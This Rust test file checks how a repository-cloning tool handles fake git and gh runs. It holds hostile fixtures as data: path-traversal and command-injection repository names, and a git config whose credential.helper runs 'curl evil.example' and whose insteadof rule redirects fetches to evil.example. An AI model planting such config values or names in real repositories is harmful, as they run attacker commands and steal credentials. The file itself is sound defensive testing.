use std::os::unix::fs::PermissionsExt;
use std::sync::Arc;

use super::*;
use crate::runs::env::RunEnv;
use crate::runs::repo::testing::wait_until_executable;
use crate::runs::repo::PINNED;

/// A `git` and a `gh` that log their arguments and the variables that matter, and make folders instead of cloning.
/// `FAKE_CLONE` says what a clone does: `ok`, `auth` (fails like a missing credential, leaving a half-made folder),
/// or `broken` (fails for another reason).
const GIT: &str = r#"#!/bin/sh
echo "git $*" >> "$LOG"
echo "git env GIT_TERMINAL_PROMPT=${GIT_TERMINAL_PROMPT-unset}" >> "$LOG"
while [ "$1" = -c ]; do shift 2; done
if [ "$1" = -C ]; then
  dir=$2; shift 2
  [ "$1" = --no-optional-locks ] && shift
  case "$1" in
    remote) cat "$dir/.fake-origin" 2>/dev/null || exit 2 ;;
    config)
      case "$*" in
        *--name-only*) sed 's/=.*//' "$dir/.fake-config" 2>/dev/null | tr '\n' '\0' ;;
        *--get-all*) sed -n "s/^$4=//p" "$dir/.fake-config" 2>/dev/null ;;
      esac ;;
    fetch) [ -f "$dir/.fake-fetch-fails" ] && { echo "fatal: unable to access: Could not resolve host" >&2; exit 128; }; echo fetched >> "$dir/.fetched" ;;
  esac
  exit 0
fi
if [ "$1" = ls-remote ]; then
  [ "$FAKE_LS" = auth ] && { echo "fatal: could not read Username for 'https://github.com': terminal prompts disabled" >&2; exit 128; }
  printf 'ref: refs/heads/trunk\tHEAD\nabc123\tHEAD\n'; exit 0
fi
[ "$1" = clone ] || exit 99
for last; do :; done
case "$FAKE_CLONE" in
  ok) mkdir -p "$last/.git"; echo "$3" > "$last/.fake-origin" ;;
  auth) mkdir -p "$last/.git"; echo "fatal: could not read Username for 'https://github.com': terminal prompts disabled" >&2; exit 128 ;;
  *) echo "fatal: unable to access: Could not resolve host" >&2; exit 128 ;;
esac
"#;

const GH: &str = r#"#!/bin/sh
echo "gh $*" >> "$LOG"
echo "gh env GIT_TERMINAL_PROMPT=${GIT_TERMINAL_PROMPT-unset} hooks=$GIT_CONFIG_KEY_0=$GIT_CONFIG_VALUE_0" >> "$LOG"
[ "$1 $2" = "auth status" ] && { case "$FAKE_GH" in signed-in*) exit 0 ;; esac; echo "You are not logged in" >&2; exit 1; }
[ "$1 $2" = "repo view" ] && { echo develop; exit 0; }
if [ "$1 $2" = "repo clone" ]; then
  [ "$FAKE_GH" = signed-in-broken ] && { echo "gh: clone failed" >&2; exit 1; }
  mkdir -p "$4/.git"; echo "https://github.com/$3.git" > "$4/.fake-origin"; exit 0
fi
exit 99
"#;

struct Rig {
    dir: PathBuf,
    home: PathBuf,
}

impl Rig {
    fn new(tag: &str) -> Self {
        let dir = std::env::temp_dir().join(format!("gossamr-fresh-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("home")).unwrap();
        let dir = dir.canonicalize().unwrap();
        Self { home: dir.join("home"), dir }
    }

    fn log(&self) -> String {
        std::fs::read_to_string(self.dir.join("log")).unwrap_or_default()
    }

    /// `gh` is installed only when `gh` is `Some`: `signed-in`, `signed-in-broken` (its clone fails) or `signed-out`.
    fn git(&self, clone: &str, gh: Option<&str>) -> Git {
        self.git_with(clone, gh, "")
    }

    /// `git`, with `ls` saying how `git ls-remote` answers: `auth` fails like a missing credential.
    fn git_with(&self, clone: &str, gh: Option<&str>, ls: &str) -> Git {
        let bin = self.dir.join("bin");
        std::fs::create_dir_all(&bin).unwrap();
        let mut tools = vec![("git", GIT)];
        tools.extend(gh.map(|_| ("gh", GH)));
        for (name, body) in tools {
            let path = bin.join(name);
            std::fs::write(&path, body).unwrap();
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
            wait_until_executable(&path);
        }
        let env = RunEnv::from_pairs([
            ("PATH", format!("{}:/usr/bin:/bin", bin.display())),
            ("LOG", self.dir.join("log").to_string_lossy().into_owned()),
            ("FAKE_CLONE", clone.into()),
            ("FAKE_GH", gh.unwrap_or("").into()),
            ("FAKE_LS", ls.into()),
            ("GH_TOKEN", "from-the-persons-shell".into()),
        ]);
        Git::new(Arc::new(env))
    }
}

impl Drop for Rig {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.dir);
    }
}

#[test]
fn the_work_path_is_one_lower_case_real_path_per_repository_and_only_for_a_valid_name() {
    let rig = Rig::new("work-path");
    let want = agents_root(&rig.home).join("acme/webshop");
    assert_eq!(work_path(&rig.home, "acme/webshop").unwrap(), want);
    assert_eq!(work_path(&rig.home, "Acme/WebShop").unwrap(), want);
    assert!(agents_root(&rig.home).is_dir(), "the work folder is made when it is missing");
    for bad in ["", "acme", "acme/web/shop", "../etc/passwd", "acme/..", "./x", "-x/y", "acme/web shop", "acme/web;rm", "acme/\u{e5}", "/acme/webshop"] {
        assert_eq!(work_path(&rig.home, bad), Err(CloneError::Invalid(bad.into())), "{bad:?}");
    }
}

#[test]
fn a_linked_home_gossamr_folder_gives_the_real_path_and_an_existing_clone_keeps_the_disks_spelling() {
    let rig = Rig::new("work-link");
    let disk = rig.dir.join("volume/Gossamr");
    std::fs::create_dir_all(disk.join("agents/Acme/WebShop/.git")).unwrap();
    std::os::unix::fs::symlink(&disk, rig.home.join("Gossamr")).unwrap();
    let path = work_path(&rig.home, "acme/webshop").unwrap();
    let real = disk.canonicalize().unwrap().join("agents");
    assert!(path.starts_with(&real), "{}", path.display());
    assert!(path.to_string_lossy().eq_ignore_ascii_case(&real.join("Acme/WebShop").to_string_lossy()), "same folder, in the disk's own case");
    assert!(in_work_folder(&rig.home, &path));
    assert!(is_work_path(&rig.home, "ACME/webshop", &path));
    assert!(!in_work_folder(&rig.home, &rig.home.join("Code/webshop")));
    assert!(!is_work_path(&rig.home, "acme/webshop", &rig.home.join("Code/webshop")));
}

#[tokio::test]
async fn a_missing_copy_is_cloned_over_https_with_hooks_off_and_prompts_off_for_git_only() {
    let rig = Rig::new("clone");
    let path = ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap().path;
    assert_eq!(path, agents_root(&rig.home).join("acme/webshop"));
    assert!(path.join(".git").is_dir());
    let log = rig.log();
    let command = format!("git {} clone -- https://github.com/acme/webshop.git {}/.webshop.cloning-", PINNED.join(" "), path.parent().unwrap().display());
    assert!(log.lines().next().unwrap().starts_with(&command), "{log}");
    assert!(log.contains("git env GIT_TERMINAL_PROMPT=0"), "{log}");
    assert!(!log.contains("from-the-persons-shell"), "the shell's variables aren't copied into arguments");
    assert!(path.strip_prefix(&rig.home).unwrap().components().all(|c| !c.as_os_str().to_string_lossy().starts_with('.')), "no hidden folders");
}

#[tokio::test]
async fn an_existing_clone_of_the_repository_is_fetched_not_cloned_again() {
    let rig = Rig::new("existing");
    let path = agents_root(&rig.home).join("acme/webshop");
    std::fs::create_dir_all(path.join(".git")).unwrap();
    std::fs::write(path.join(".fake-origin"), "git@github.com:acme/webshop.git").unwrap();
    let ensured = ensure_clone(&rig.git("broken", None), &rig.home, "acme/webshop", true).await.unwrap();
    assert_eq!((ensured.path, ensured.cloned, ensured.fetched), (path.clone(), false, Some(Fetched::Done)));
    assert!(path.join(".fetched").exists());
    assert!(!rig.log().contains(" clone "), "{}", rig.log());
    assert!(rig.log().contains(&format!("{} -C {} fetch --prune --quiet origin", PINNED.join(" "), path.display())));
}

#[tokio::test]
async fn another_repository_or_a_plain_folder_at_the_path_is_refused_and_left_alone() {
    let rig = Rig::new("occupied");
    let path = agents_root(&rig.home).join("acme/webshop");
    std::fs::create_dir_all(path.join(".git")).unwrap();
    std::fs::write(path.join(".fake-origin"), "https://github.com/acme/other").unwrap();
    let git = rig.git("ok", None);
    assert!(matches!(ensure_clone(&git, &rig.home, "acme/webshop", true).await, Err(CloneError::Occupied { .. })));
    std::fs::remove_dir_all(path.join(".git")).unwrap();
    std::fs::write(path.join("notes.txt"), "mine").unwrap();
    assert!(matches!(ensure_clone(&git, &rig.home, "acme/webshop", true).await, Err(CloneError::Occupied { .. })));
    assert_eq!(std::fs::read_to_string(path.join("notes.txt")).unwrap(), "mine");
    assert!(!rig.log().contains(" clone "));
}

#[tokio::test]
async fn a_symlinked_path_is_refused() {
    let rig = Rig::new("symlink");
    let elsewhere = rig.dir.join("elsewhere");
    std::fs::create_dir_all(elsewhere.join(".git")).unwrap();
    std::fs::write(elsewhere.join(".fake-origin"), "https://github.com/acme/webshop").unwrap();
    let path = agents_root(&rig.home).join("acme/webshop");
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::os::unix::fs::symlink(&elsewhere, &path).unwrap();
    assert!(matches!(ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await, Err(CloneError::Occupied { .. })));
}

#[tokio::test]
async fn a_failed_clone_removes_the_folder_it_made_and_nothing_else() {
    let rig = Rig::new("cleanup");
    let sibling = agents_root(&rig.home).join("acme/other");
    std::fs::create_dir_all(&sibling).unwrap();
    let err = ensure_clone(&rig.git("broken", None), &rig.home, "acme/webshop", true).await.unwrap_err();
    assert_eq!(err, CloneError::Failed("fatal: unable to access: Could not resolve host".into()));
    assert!(!agents_root(&rig.home).join("acme/webshop").exists());
    assert_eq!(std::fs::read_dir(sibling.parent().unwrap()).unwrap().count(), 1, "the temporary folder is gone too");
    assert!(sibling.exists());
}

#[tokio::test]
async fn a_credential_failure_falls_back_to_a_signed_in_gh_with_hooks_off() {
    let rig = Rig::new("gh");
    let path = ensure_clone(&rig.git("auth", Some("signed-in")), &rig.home, "acme/webshop", true).await.unwrap().path;
    assert!(path.join(".git").is_dir(), "the half-made folder from git is replaced by gh's clone");
    let log = rig.log();
    assert!(log.contains(&format!("gh repo clone acme/webshop {}/.webshop.cloning-", path.parent().unwrap().display())), "{log}");
    assert!(log.contains("gh env GIT_TERMINAL_PROMPT=0 hooks=core.hooksPath=/dev/null"), "{log}");
}

#[tokio::test]
async fn without_a_usable_gh_a_credential_failure_says_what_git_said_and_leaves_nothing() {
    let rig = Rig::new("noauth");
    let want = CloneError::Auth("fatal: could not read Username for 'https://github.com': terminal prompts disabled".into());
    for gh in [None, Some("signed-out")] {
        assert_eq!(ensure_clone(&rig.git("auth", gh), &rig.home, "acme/webshop", true).await.unwrap_err(), want);
        assert!(!agents_root(&rig.home).join("acme/webshop").exists());
    }
    assert!(!rig.log().contains("repo clone"));
}

#[tokio::test]
async fn gh_failing_too_is_reported_and_cleaned_up_but_other_failures_never_try_gh() {
    let rig = Rig::new("ghfail");
    let git = rig.git("auth", Some("signed-in-broken"));
    assert_eq!(ensure_clone(&git, &rig.home, "acme/webshop", true).await.unwrap_err(), CloneError::Auth("gh: clone failed".into()));
    assert!(!agents_root(&rig.home).join("acme/webshop").exists());

    let rig = Rig::new("nogh");
    assert!(matches!(ensure_clone(&rig.git("broken", Some("signed-in")), &rig.home, "acme/webshop", true).await, Err(CloneError::Failed(_))));
    assert!(!rig.log().contains("gh "), "a network failure isn't a sign-in problem");
}

#[tokio::test]
async fn names_that_could_leave_the_folder_are_refused_before_anything_is_made() {
    let rig = Rig::new("hostile");
    let git = rig.git("ok", None);
    for bad in ["../evil/x", "acme/..", "a/b/c", "acme", "-c/x", "acme/web;touch"] {
        assert_eq!(ensure_clone(&git, &rig.home, bad, true).await.unwrap_err(), CloneError::Invalid(bad.into()));
    }
    assert!(!rig.home.join("Gossamr").exists());
    assert_eq!(rig.log(), "");
}

#[tokio::test]
async fn a_symlinked_owner_folder_that_leaves_agents_root_is_refused() {
    let rig = Rig::new("escape");
    let outside = rig.dir.join("outside");
    std::fs::create_dir_all(&outside).unwrap();
    std::fs::create_dir_all(agents_root(&rig.home)).unwrap();
    std::os::unix::fs::symlink(&outside, agents_root(&rig.home).join("acme")).unwrap();
    assert!(matches!(ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await, Err(CloneError::Failed(_))));
    assert_eq!(std::fs::read_dir(&outside).unwrap().count(), 0);
    assert!(!rig.log().contains(" clone "));
}

#[tokio::test]
async fn a_clone_with_a_credential_helper_or_an_insteadof_rule_is_not_fetched_and_only_the_keys_are_named() {
    let rig = Rig::new("unsafe-config");
    let path = agents_root(&rig.home).join("acme/webshop");
    std::fs::create_dir_all(path.join(".git")).unwrap();
    std::fs::write(path.join(".fake-origin"), "https://github.com/acme/webshop.git").unwrap();
    std::fs::write(path.join(".fake-config"), "core.filemode=true\ncredential.helper=!sh -c 'curl evil.example'\nurl.https://evil.example/.insteadof=https://github.com/\n").unwrap();
    let ensured = ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap();
    let Some(Fetched::Not(why)) = ensured.fetched else { panic!("{ensured:?}") };
    assert!(why.contains("credential.helper") && why.contains("url.*.insteadof"), "{why}");
    assert!(!why.contains("curl") && !why.contains("evil.example"), "values and URLs are never repeated: {why}");
    assert!(!path.join(".fetched").exists());
}

#[tokio::test]
async fn a_token_inside_a_url_in_a_setting_name_is_never_repeated() {
    let rig = Rig::new("token-key");
    let path = agents_root(&rig.home).join("acme/webshop");
    std::fs::create_dir_all(path.join(".git")).unwrap();
    std::fs::write(path.join(".fake-origin"), "https://github.com/acme/webshop.git").unwrap();
    std::fs::write(path.join(".fake-config"), "url.https://x-access-token:ghp_TOKEN@github.com/.insteadof=https://github.com/\nhttp.https://ghp_TOKEN@github.com/.extraheader=x\n").unwrap();
    let ensured = ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap();
    let Some(Fetched::Not(why)) = ensured.fetched else { panic!("{ensured:?}") };
    assert!(why.contains("url.*.insteadof") && why.contains("http.*.extraheader") && !why.contains("ghp_TOKEN"), "{why}");
}

#[tokio::test]
async fn a_clone_whose_fetch_rule_was_changed_is_not_fetched_and_a_normal_fetch_names_its_refspec() {
    let rig = Rig::new("fetch-rule");
    let path = agents_root(&rig.home).join("acme/webshop");
    std::fs::create_dir_all(path.join(".git")).unwrap();
    std::fs::write(path.join(".fake-origin"), "https://github.com/acme/webshop.git").unwrap();
    std::fs::write(path.join(".fake-config"), "remote.origin.url=https://github.com/acme/webshop.git\nremote.origin.fetch=+refs/heads/gone/*:refs/heads/worktree-*\n").unwrap();
    let ensured = ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap();
    assert!(matches!(ensured.fetched, Some(Fetched::Not(ref why)) if why.contains("fetch rules were changed")), "{ensured:?}");
    assert!(!path.join(".fetched").exists());

    std::fs::write(path.join(".fake-config"), "remote.origin.fetch=+refs/heads/*:refs/remotes/origin/*\n").unwrap();
    assert_eq!(ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap().fetched, Some(Fetched::Done));
    assert!(rig.log().contains("fetch --prune --quiet origin +refs/heads/*:refs/remotes/origin/*"), "{}", rig.log());
}

#[test]
fn an_owner_folder_that_exists_in_another_case_gives_the_path_the_disk_keeps() {
    let rig = Rig::new("owner-case");
    std::fs::create_dir_all(agents_root(&rig.home).join("Shopify/liquid")).unwrap();
    let path = work_path(&rig.home, "Shopify/Polaris").unwrap();
    assert_eq!(path, real(&path), "{path:?} is as the disk keeps it");
    assert!(path.ends_with("polaris") && path.parent().unwrap().file_name().unwrap().eq_ignore_ascii_case("shopify"), "{path:?}");
    std::fs::create_dir_all(&path).unwrap();
    assert_eq!(work_path(&rig.home, "shopify/polaris").unwrap(), path.canonicalize().unwrap());
}

#[tokio::test]
async fn a_temporary_folder_older_than_the_clone_limit_is_removed_and_a_newer_one_is_not() {
    let rig = Rig::new("stale-temps");
    let path = agents_root(&rig.home).join("acme/webshop");
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    let stale = path.with_file_name(".webshop.cloning-0123456789ab");
    let fresh = path.with_file_name(".webshop.cloning-ba9876543210");
    std::fs::create_dir_all(&stale).unwrap();
    std::fs::create_dir_all(&fresh).unwrap();
    std::fs::File::open(&stale).unwrap().set_modified(std::time::SystemTime::now() - CLONE_LIMIT - Duration::from_secs(60)).unwrap();
    remove_stale_temps(&rig.home, "acme/webshop");
    assert!(!stale.exists() && fresh.exists(), "only a leftover older than the clone limit is removed");
}

#[tokio::test]
async fn a_clone_made_by_gh_with_an_ssh_origin_and_an_upstream_remote_is_fetched() {
    let rig = Rig::new("gh-config");
    let path = agents_root(&rig.home).join("acme/webshop");
    std::fs::create_dir_all(path.join(".git")).unwrap();
    std::fs::write(path.join(".fake-origin"), "git@github.com:acme/webshop.git").unwrap();
    let config = ["core.repositoryformatversion=0", "remote.origin.url=git@github.com:acme/webshop.git", "remote.origin.fetch=+refs/heads/*:refs/remotes/origin/*", "remote.upstream.url=git@github.com:up/webshop.git", "remote.upstream.fetch=+refs/heads/*:refs/remotes/upstream/*", "remote.origin.gh-resolved=base", "branch.main.remote=origin", "branch.main.merge=refs/heads/main", "branch.worktree-x.remote=origin"];
    std::fs::write(path.join(".fake-config"), config.join("\n")).unwrap();
    let ensured = ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap();
    assert_eq!(ensured.fetched, Some(Fetched::Done));
}

#[tokio::test]
async fn a_fetch_that_fails_is_reported_and_the_clone_is_still_returned() {
    let rig = Rig::new("fetch-fails");
    let path = agents_root(&rig.home).join("acme/webshop");
    std::fs::create_dir_all(path.join(".git")).unwrap();
    std::fs::write(path.join(".fake-origin"), "https://github.com/acme/webshop.git").unwrap();
    std::fs::write(path.join(".fake-fetch-fails"), "").unwrap();
    let ensured = ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap();
    assert_eq!(ensured.fetched, Some(Fetched::Not("fatal: unable to access: Could not resolve host".into())));
    assert_eq!(ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", false).await.unwrap().fetched, None, "no fetch when none is due");
}

#[tokio::test]
async fn the_default_branch_of_a_repository_with_no_clone_comes_from_the_remote_then_from_gh() {
    let rig = Rig::new("default-branch");
    assert_eq!(remote_default_branch(&rig.git("ok", None), "acme/webshop").await.unwrap(), "trunk");
    let rig = Rig::new("default-branch-auth");
    let git = rig.git_with("ok", Some("signed-in"), "auth");
    assert_eq!(remote_default_branch(&git, "acme/webshop").await.unwrap(), "develop");
    let rig = Rig::new("default-branch-no-gh");
    let git = rig.git_with("ok", None, "auth");
    assert!(matches!(remote_default_branch(&git, "acme/webshop").await, Err(CloneError::Auth(_))));
}

#[tokio::test]
async fn two_holders_of_one_repositorys_file_lock_take_turns() {
    let rig = Rig::new("file-lock");
    let first = lock_repo(&rig.home, "Acme/WebShop").await.unwrap();
    let home = rig.home.clone();
    let second = tokio::spawn(async move { lock_repo(&home, "acme/webshop").await.map(drop) });
    tokio::time::sleep(std::time::Duration::from_millis(150)).await;
    assert!(!second.is_finished(), "the second waits while the first holds it");
    drop(first);
    second.await.unwrap().unwrap();
    assert!(agents_root(&rig.home).join(".locks/acme__webshop").is_file());
}
